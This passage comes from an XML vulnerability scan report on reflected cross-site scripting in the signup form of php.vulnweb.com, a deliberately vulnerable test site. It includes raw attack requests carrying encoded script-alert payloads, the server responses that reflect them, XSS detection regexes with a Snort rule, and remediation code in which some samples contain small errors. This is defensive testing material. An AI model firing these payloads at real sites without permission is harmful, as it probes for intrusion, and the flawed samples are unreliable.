protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="D1A1C5D0E865E1A0D106EA9777487F32"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="D1A1C5D0E865E1A0D106EA9777487F32";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uphone";AttackParamIndex="6";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="770%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2531%2538%2535%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="b925d3bb";
X-Request-Memo: ID="5cd6561b";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%31%38%35%31%29%3c%2f%73%43%72%49%70%54%3e&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:53:02 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 811

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770<sCrIpT>alert(51851)</sCrIpT></li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="D1A1C5D0E865E1A0D106EA9777487F32"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%31%38%35%31%29%3c%2f%73%43%72%49%70%54%3e&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>242</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="D1A1C5D0E865E1A0D106EA9777487F32";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uphone";AttackParamIndex="6";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="770%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2531%2538%2535%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="b925d3bb";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="5cd6561b";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770<sCrIpT>alert(51851)</sCrIpT></li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:53:02 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>811</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="55971BA851CE5DCD03B7513DF04D8048"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uaddress</AttackParamDescriptor><Issues><Issue id="8dfa6cf1-74ed-47bd-9991-723eae13b531"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="55971BA851CE5DCD03B7513DF04D8048";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uaddress";AttackParamIndex="7";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="1707%2520Interdimensional%2520Street%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2533%2538%2531%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="379fbf04";
X-Request-Memo: ID="32b184b8";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%33%38%31%31%29%3c%2f%73%43%72%49%70%54%3e&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="857" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk 